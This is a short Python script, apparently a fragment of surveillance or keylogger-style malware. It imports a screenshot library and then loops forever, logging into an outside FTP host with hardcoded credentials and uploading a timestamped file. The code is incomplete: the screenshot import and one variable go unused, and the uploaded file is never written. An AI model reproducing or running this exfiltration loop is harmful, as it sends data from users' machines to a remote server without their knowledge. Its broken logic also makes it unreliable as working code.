import time
import pyscreenshot
import ftplib
s=time.strftime("%Y-%m-%d-%H %M")
vin=s+".txt"
vins="STOR "+s+".txt"
while True:
	session = ftplib.FTP('ftp.geocities.ws','sefgfaulted','wepartyrock')
	session.set_debuglevel(2)
	file = open(vin,'rb')
	session.storbinary('STOR '+vin,file)
	file.close()
	session.quit()
